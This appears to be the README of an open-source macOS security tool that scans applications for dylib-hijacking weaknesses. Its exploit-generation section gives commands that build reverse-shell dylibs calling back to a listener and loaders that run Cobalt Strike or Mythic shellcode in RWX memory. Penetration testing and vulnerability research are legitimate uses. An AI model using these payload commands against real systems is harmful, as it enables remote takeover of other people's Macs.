# Callandor

![Callandor Logo](logo.png)

A dark, powerful Swift-based tool designed to hunt down **Dynamic Library (dylib) Hijacking** vulnerabilities in macOS applications. Named after the "Sword That Is Not A Sword", it acts as both a scanner and a weapon (exploit generator).

## 🚀 Features

*   **⚡ Fast Recursive Scanning**: Traverses deeply nested directories and application bundles `.app`.
*   **🔍 Advanced Vulnerability Detection**:
    *   **Weak Dylibs**: Identifies `LC_LOAD_WEAK_DYLIB` commands pointing to missing libraries in writable directories.
    *   **RPATH Hijacking**: Detects insecure `LC_RPATH` configurations that allow current-user writing.
    *   **Relative Path Loading**: Flags libraries loaded via relative paths (e.g., `lib/foo.dylib`).
    *   **Environment Variable Injection**: Analyzes `__RESTRICT` segments, Hardened Runtime flags, and Entitlements to determine susceptibility to `DYLD_INSERT_LIBRARIES` injection.
*   **📊 Flexible Reporting**: Outputs results in **JSON** (for automation), **Markdown** (for reports), or colorized **Text** (for terminal usage).
*   **🔥 Auto-Exploit Generation**: Automatically generates and compiles malicious dylibs (C-based) for identified vulnerabilities. Supports **Reverse Shells** and **Raw Shellcode** (e.g., Mythic agents).

## 🛠 Installation

Build from source using Swift:

```bash
cd Callandor
swift build -c release
cp .build/release/Callandor /usr/local/bin/
```

## 💻 Usage

```bash
Callandor <directory_path> [options]
```

### Options

*   `--json`: Output results in JSON format.
*   `--markdown`: Output results in Markdown format.
*   `-h, --help`: Show help menu.

### Example

**Scan your Applications folder:**

```bash
Callandor /Applications --markdown > report.md
```

**JSON Output for Automation:**

```bash
Callandor ~/MyProjects --json | jq .
```

### 💥 Exploit Generation

The tool can automatically generate and compile a malicious `.dylib` to verify vulnerabilities.

**Generate a Reverse Shell Dylib:**
Connects back to your listener (e.g., `nc -lvp 4444`).

```bash
Callandor generate --type revshell --host 10.0.0.5 --port 4444 --output payload.dylib
```

**Generate a Raw Shellcode Loader Dylib:**
Loads raw shellcode (e.g., from Mythic or Cobalt Strike) into memory (`RX` -> `RWX` mapped) and executes it.

```bash
Callandor generate --type raw --payload agent.bin --output agent.dylib
```

## 🛡 Vulnerabilities Detected

| Vulnerability Type | Severity | Description |
| :--- | :--- | :--- |
| `weakDylibMissing` | **High** | A weak library load command references a missing file in a writable directory. |
| `writableRpath` | **High** | An `LC_RPATH` directory is writable by the user, allowing dylib planting. |
| `envVarInjection` | **High** | Binary lacks Hardened Runtime or Restricted status, allowing code injection via environment variables. |
| `relativePath` | **Medium** | Library is loaded via a relative path, which can be manipulated. |

## 🎨 Visuals

The tool features a raw, cyberpunk-inspired CLI interface.

## 📄 License

MIT License. Use responsibly.
